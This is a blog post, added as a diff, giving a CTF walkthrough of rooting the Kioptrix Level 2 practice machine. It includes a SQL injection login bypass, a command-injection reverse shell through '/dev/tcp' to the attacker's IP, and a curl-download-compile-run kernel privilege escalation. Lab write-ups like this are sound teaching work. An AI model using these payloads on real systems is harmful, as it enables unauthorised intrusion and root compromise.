@@ -1,0 +1,179 @@
+---
+layout: post
+title: "Kioptrix 2 writeup"
+subtitle: "~ Walkthrough of Kioptrix 2 machine ~"
+date: 2017-10-04
+author: V3ded
+category: CTF
+tags: blog ctf pentesting 
+finished: true
+excerpt_separator: <!--more-->
+---
+
+# Intro
+Hey guys, in this post I'll try and show you how to solve Level 2 Kioptrix machine. This is a first blog and there is heavy ongoing experimentation with Jekyll markup, so expect some aesthetical errors and uneven parts or padding.
+Without further a do, let's start. <!--more-->
+
+***
+
+# Scanning, enumeration and exploitation
+Run netdiscover to find the IP of our needed machine:
+
+```console
+root@EdgeOfNight:~# netdiscover 
+
+ Currently scanning: 192.168.45.0/16   |   Screen View: Unique Hosts           
+                                                                               
+ 9 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 540               
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.0.1       [REDACTED]          2      120  Compal Broadband Networks, I
+ 192.168.0.54      [REDACTED]          2      120  AzureWave Technology Inc.   
+ 192.168.0.87      [REDACTED]          1      60  Kaonmedia CO., LTD.         
+ 192.168.0.115     [REDACTED]          1      60  PCS Systemtechnik GmbH      
+ 192.168.0.234     [REDACTED]          1      60  Apple, Inc.                 
+ 192.168.0.53      [REDACTED]          1      60  Hon Hai Precision Ind. Co.,L
+ 192.168.0.101     [REDACTED]          1      60  Hon Hai Precision Ind. Co.,L
+```
+
+By digging around a bit I've found out that Kioptrix has been assined an IP of **192.168.0.115** !
+
+As always it's important to find as much information about our target as possible and therefore I decided to run an nmap Scan.
+
+```console
+root@EdgeOfNight:~# nmap -A -T5 -sS 192.168.0.115
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-03 21:26 BST
+Nmap scan report for 192.168.0.115
+Host is up (0.00020s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
+| ssh-hostkey: 
+|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
+|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
+|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
+|_http-server-header: Apache/2.0.52 (CentOS)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+111/tcp  open  rpcbind    2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1            915/udp  status
+|_  100024  1            918/tcp  status
+443/tcp  open  ssl/https?
+|_ssl-date: 2017-10-04T00:27:31+00:00; +4h00m02s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
+631/tcp  open  ipp        CUPS 1.1
+| http-methods: 
+|_  Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+|_http-title: 403 Forbidden
+3306/tcp open  mysql      MySQL (unauthorized)
+MAC Address: 08:00:27:81:47:B7 (Oracle VirtualBox virtual NIC)
+Device type: general purpose|media device
+Running: Linux 2.6.X, Star Track embedded
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:2.6.23 cpe:/h:star_track:srt2014hd
+OS details: Linux 2.6.9 - 2.6.30, Star Track SRT2014HD satellite receiver (Linux 2.6.23)
+Network Distance: 1 hop
+
+Host script results:
+|_clock-skew: mean: 4h00m01s, deviation: 0s, median: 4h00m01s
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.20 ms 192.168.0.115
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 121.00 seconds
+```
+
+We get hits on different ports such as 22 [SSH], 80 [HTTP], 111 [RPC bind], 3306 [MYSQL] and more.  Because our target is running an HTTP web server we put the IP in a browser which results in this page:
+
+<a href="/img/blog/kioptrix2/kioptrix2-01.jpg" target="_blank"><img class="centerImgHuge" src="/img/blog/kioptrix2/kioptrix2-01.jpg"></a>
+
+This seems like a custom, lazy-made login function. Normally I wouldn't try and break login pages & their authentication in the first stage of enumeration, but because of the cheap look, an attempt for [SQL injection](https://www.w3schools.com/sql/sql_injection.asp) won't hurt. And indeed, a simple `' or 1=1#` did the trick!  Login has been successfully bypassed and we are presented with yet another challenge!  
+
+<a href="/img/blog/kioptrix2/kioptrix2-02.jpg" target="_blank"><img class="centerImgMedium" src="/img/blog/kioptrix2/kioptrix2-02.jpg"></a>
+
+From enough completed challenges and CTFs I immediately recognized a possible code injection vulnerability. Let me explain. Our current webapp prompts us to enter a machine to ping. If you think about what's happening inside our target, a command like this is parsed: `ping Entered_IP`. Seems harmless, right? Well, no it is not! A character like "semicolon" (;) or "OR" can be used to append a terminator to the preset ping command which changes a query from `ping ENTERED_IP` to  `ping ENTERED_IP; malicious input`. This effectively allows for code execution which makes us able to enter any command we like into our designated machine. 
+
+<a href="/img/blog/kioptrix2/kioptrix2-03.jpg" target="_blank"><img style="display: block; margin-left: auto; margin-right: auto; width: 25%;" src="/img/blog/kioptrix2/kioptrix2-03.jpg"></a>
+
+An attempt to estabilish a reverse shell with netcat was made, but as it appears, our target doesn't  have it. Luckily, there was another trick up my sleeve - `; bash -i >& /dev/tcp/192.168.0.213/4444 0>&1`. This is just another way of telling a computer to connect back to you. Of course before doing this we need to ready our netcat listener. `nc -lvp 4444`
+
+<a href="/img/blog/kioptrix2/kioptrix2-04.jpg" target="_blank"><img class="centerImgMedium" src="/img/blog/kioptrix2/kioptrix2-04.jpg"></a>
+			 
+> lvp - listen, verbose, port
+
+If you are interested in doing more research in this topic I highly suggest this article: <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>
+
+***
+
+# Post Exploitation
+Feels good once you get that shell, doesn't it? Non the less, we need to escalate our privileges and  pwn the server as a whole - not just as apache. Time to snoop around!
+
+There are 2 users in the home directory (john and harold), however both of them have restriced home folders which we can not access. A search for uncommon misconfigurations such as writable passwd or shadow file yielded no result. After a while during my system enumeration I spotted that the kernel is pretty outdated. 
+`uname -a` results in  `Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux`
+
+Last compiled in 2007? This possibly opens up a privilege escalation vulnerability. After the finding, google search or exploitdb can be used for locating a corresponding kernel exploit. File of interest: <https://www.exploit-db.com/exploits/9545/>. Usually it's a good practice to avoid kernel exploitation as this opens up many dangers such as crashing or corrupting the machine. Always make sure there are no other options before trying kernel exploitation!
+
+I decided to download the code onto my machine, host it on apache 2 webserver and make the victim download it via the previously gained shell. Here are the steps:
+
+##### Our machine (privesc.c is the exploit you downloaded):
+```console
+root@EdgeOfNight:~# mv /root/Downloads/privesc.c /var/www/html/ && /etc/init.d/apache2 start
+[ ok ] Starting apache2 (via systemctl): apache2.service.
+```
+##### Where:
+```
+mv                        - moves privesc.c file from Downloads to /var/www/html
+
+/etc/init.d/apache2 start - starts apache web server on our machine which makes privesc.c file downloadable by accessing our IP address
+
+&&                        - executes the 2 commands after each other
+```
+
+
+##### Kioptrix machine:
+```console
+cd /tmp && id && curl 192.168.0.213/exploit.c -o exploit.c 2> /dev/null && gcc exploit.c && ./a.out 
+```
+##### Where:
+```
+cd /tmp - changes working directory to /tmp
+
+id      - prints user information before privilege escalation
+
+curl IP/exploit.c - makes an HTTP request to our machine where /exploit.c is the path to the corresponding exploit, -o saves the output of the request, 2> 
+                    pipes the curl stderr output into /dev/null (suppresses errors)
+
+gcc exploit.c     - compiles our C code using GCC
+
+./a.out           - runs the compiled binary from GCC (every compiled file by this compiler has default output name of a.out)
+```
+
+<a href="/img/blog/kioptrix2/kioptrix2-05.jpg" target="_blank"><img class="centerImgLarge" src="/img/blog/kioptrix2/kioptrix2-05.jpg"></a>
+
+### Congratulations! The box has been rooted!
+
+***
+
+# Conclusion
+A solid box with a lot of hidden knowledge for new people entering infosec community. There are always things to learn no matter how many times you do them - same with this box. Personally I found this challenge quite easy, but enjoyed it non the less. My thanks goes to the creator for making such an awesome box.
+
+Have any suggestions or feedback? Write it down below in the comments or send me a message on Twitter (@v3ded).
+
+~V3
